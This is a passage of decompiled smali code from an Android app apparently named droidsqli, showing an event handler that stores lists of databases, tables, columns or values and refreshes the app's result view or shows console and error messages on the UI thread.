    invoke-virtual {p0, v6}, Lnet/edgard/droidsqli/main_activity;->runOnUiThread(Ljava/lang/Runnable;)V

    .line 387
    :cond_0
    :goto_0
    return-void

    .line 307
    :cond_1
    const-string v6, "add-info"

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v7, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_2

    .line 308
    new-instance v6, Lnet/edgard/droidsqli/main_activity$9;

    invoke-direct {v6, p0, v0}, Lnet/edgard/droidsqli/main_activity$9;-><init>(Lnet/edgard/droidsqli/main_activity;Lnet/edgard/droidsqli/mvc/model/InjectionModel;)V

    invoke-virtual {p0, v6}, Lnet/edgard/droidsqli/main_activity;->runOnUiThread(Ljava/lang/Runnable;)V

    goto :goto_0

    .line 315
    :cond_2
    const-string v6, "console-message"

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v7, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_3

    .line 319
    iget-object v6, p0, Lnet/edgard/droidsqli/main_activity;->mainActivity:Lnet/edgard/droidsqli/main_activity;

    new-instance v7, Lnet/edgard/droidsqli/main_activity$10;

    invoke-direct {v7, p0, v4}, Lnet/edgard/droidsqli/main_activity$10;-><init>(Lnet/edgard/droidsqli/main_activity;Lnet/edgard/droidsqli/mvc/model/ObserverEvent;)V

    invoke-virtual {v6, v7}, Lnet/edgard/droidsqli/main_activity;->runOnUiThread(Ljava/lang/Runnable;)V

    goto :goto_0

    .line 336
    :cond_3
    const-string v6, "add-databases"

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v7, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_4

    .line 338
    invoke-virtual {v4}, Lnet/edgard/droidsqli/mvc/model/ObserverEvent;->getArg()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/util/ArrayList;

    .line 340
    .local v2, "newDatabases":Ljava/util/List;, "Ljava/util/List<*>;"
    const-string v6, "database"

    iput-object v6, p0, Lnet/edgard/droidsqli/main_activity;->listType:Ljava/lang/String;

    .line 342
    iput-object v2, p0, Lnet/edgard/droidsqli/main_activity;->databases:Ljava/util/List;

    .line 344
    invoke-direct {p0}, Lnet/edgard/droidsqli/main_activity;->updateResultListView()V

    goto :goto_0

    .line 346
    .end local v2    # "newDatabases":Ljava/util/List;, "Ljava/util/List<*>;"
    :cond_4
    const-string v6, "add-tables"

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v7, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_5

    .line 348
    invoke-virtual {v4}, Lnet/edgard/droidsqli/mvc/model/ObserverEvent;->getArg()Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Ljava/util/ArrayList;

    .line 350
    .local v3, "newTables":Ljava/util/List;, "Ljava/util/List<*>;"
    const-string v6, "table"

    iput-object v6, p0, Lnet/edgard/droidsqli/main_activity;->listType:Ljava/lang/String;

    .line 352
    iput-object v3, p0, Lnet/edgard/droidsqli/main_activity;->tables:Ljava/util/List;

    .line 354
    invoke-direct {p0}, Lnet/edgard/droidsqli/main_activity;->updateResultListView()V

    goto/16 :goto_0

    .line 356
    .end local v3    # "newTables":Ljava/util/List;, "Ljava/util/List<*>;"
    :cond_5
    const-string v6, "add-columns"

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v7, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_6

    .line 358
    invoke-virtual {v4}, Lnet/edgard/droidsqli/mvc/model/ObserverEvent;->getArg()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/util/List;

    .line 360
    .local v1, "newColumns":Ljava/util/List;, "Ljava/util/List<*>;"
    const-string v6, "column"

    iput-object v6, p0, Lnet/edgard/droidsqli/main_activity;->listType:Ljava/lang/String;

    .line 362
    iput-object v1, p0, Lnet/edgard/droidsqli/main_activity;->columns:Ljava/util/List;

    .line 364
    invoke-direct {p0}, Lnet/edgard/droidsqli/main_activity;->updateResultListView()V

    goto/16 :goto_0

    .line 366
    .end local v1    # "newColumns":Ljava/util/List;, "Ljava/util/List<*>;"
    :cond_6
    const-string v6, "add-values"

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v7, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_7

    .line 368
    invoke-virtual {v4}, Lnet/edgard/droidsqli/mvc/model/ObserverEvent;->getArg()Ljava/lang/Object;

    move-result-object v5

    check-cast v5, [Ljava/lang/Object;

    .line 370
    .local v5, "observerEventData":[Ljava/lang/Object;
    const-string v6, "value"

    iput-object v6, p0, Lnet/edgard/droidsqli/main_activity;->listType:Ljava/lang/String;

    .line 372
    const/4 v6, 0x1

    aget-object v6, v5, v6

    check-cast v6, [[Ljava/lang/String;

    sput-object v6, Lnet/edgard/droidsqli/main_activity;->values:[[Ljava/lang/String;

    .line 374
    invoke-direct {p0}, Lnet/edgard/droidsqli/main_activity;->updateResultListView()V

    goto/16 :goto_0

    .line 377
    .end local v5    # "observerEventData":[Ljava/lang/Object;
    :cond_7
    const-string v6, "error-message"

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v7, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_0

    .line 379
    iget-object v6, p0, Lnet/edgard/droidsqli/main_activity;->mainActivity:Lnet/edgard/droidsqli/main_activity;

    new-instance v7, Lnet/edgard/droidsqli/main_activity$11;

    invoke-direct {v7, p0}, Lnet/edgard/droidsqli/main_activity$11;-><init>(Lnet/edgard/droidsqli/main_activity;)V

    invoke-virtual {v6, v7}, Lnet/edgard/droidsqli/main_activity;->runOnUiThread(Ljava/lang/Runnable;)V

    goto/16 :goto_0
.end method
